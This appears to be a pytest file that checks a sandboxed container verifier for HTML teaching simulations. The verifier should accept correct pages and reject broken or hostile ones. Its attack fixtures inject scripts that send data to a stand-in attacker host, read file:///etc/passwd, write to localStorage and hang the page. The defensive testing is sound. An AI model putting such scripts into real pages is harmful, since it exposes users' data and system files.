"""Untrusted bytes execute only inside the restricted verifier container."""

from importlib.resources import files
from pathlib import Path

import pytest
from lunaris_live.sims.container_verifier import ContainerSimVerifier
from lunaris_live.sims.content_hash import content_hash
from lunaris_live.sims.reference_app import reference_app
from lunaris_live.sims.schema.candidate import SimCandidate
from lunaris_live.sims.schema.teaching_spec import TeachingCase, TeachingSpec
from lunaris_live.sims.schema.verified_bundle import VerifiedBundle
from pydantic import ValidationError

pytestmark = pytest.mark.browser
ROOT = Path(__file__).resolve().parents[2]


def _candidate():
    html = files("lunaris_live.sims").joinpath("reference.html").read_text()
    return (
        html.replace('id="x" type=', 'id="x" data-sim-param="x" type=')
        .replace('id="y" for=', 'id="y" data-sim-output="y" for=')
        .replace('id="ask" disabled', 'id="ask" data-sim-action="discuss" disabled')
    )


@pytest.mark.parametrize(
    "mutation,approved",
    [
        ("good", True),
        ("unicode", True),
        ("wrong_mechanism", False),
        ("invalid_event", False),
        ("hidden_output", False),
        ("no_command_redraw", False),
        ("network", False),
        ("storage", False),
        ("file", False),
        ("hang", False),
    ],
)
async def test_independent_relationship_and_safety_checks(mutation, approved):
    html = _candidate()
    if mutation == "unicode":
        html += "<!--" + "学" * 80_000 + "-->"
    if mutation == "wrong_mechanism":
        html = html.replace("Number(x.value) * 2", "Number(x.value) * 3")
    if mutation == "hidden_output":
        html = html.replace('data-sim-output="y"', 'data-sim-output="y" style="display:none"')
    if mutation == "invalid_event":
        html = html.replace("kind:'param_changed'", "kind:'invalid-event'")
    if mutation == "no_command_redraw":
        html = html.replace(
            "x.value = String(data.state.x); draw();", "x.value = String(data.state.x);"
        )
    attacks = {
        "network": "fetch('https://attacker.invalid/steal')",
        "storage": "localStorage.setItem('secret', 'value')",
        "file": "fetch('file:///etc/passwd')",
        "hang": "while(true) {}",
    }
    if mutation in attacks:
        html += "<script>" + attacks[mutation] + "</script>"
    spec = TeachingSpec(
        contract=reference_app().contract,
        source="Reviewed linear relationship",
        source_version="1",
        cases=[TeachingCase(state={"x": x}, outputs={"y": f"y = {2 * x}"}) for x in (0, 4, 10)],
    )
    verifier = ContainerSimVerifier(
        image="lunaris-sim-verifier:test", seccomp=ROOT / "infra/sim-verifier/seccomp.json"
    )
    report = await verifier.verify(SimCandidate(html=html), spec)
    assert report.approved is approved, report.model_dump()
    assert report.content_hash == content_hash(html)
    assert report.spec_hash == content_hash(spec.model_dump_json(by_alias=True))
    assert report.elapsed_ms < 35_000
    if approved:
        assert report.checks_passed >= 4
        assert report.reasons == []
        verified = VerifiedBundle(candidate=SimCandidate(html=html), spec=spec, report=report)
        assert verified.candidate.html == html
        with pytest.raises(ValidationError, match="exact independently verified"):
            VerifiedBundle(candidate=SimCandidate(html=html + "changed"), spec=spec, report=report)
    else:
        assert report.reasons
        with pytest.raises(ValidationError, match="exact independently verified"):
            VerifiedBundle(candidate=SimCandidate(html=html), spec=spec, report=report)
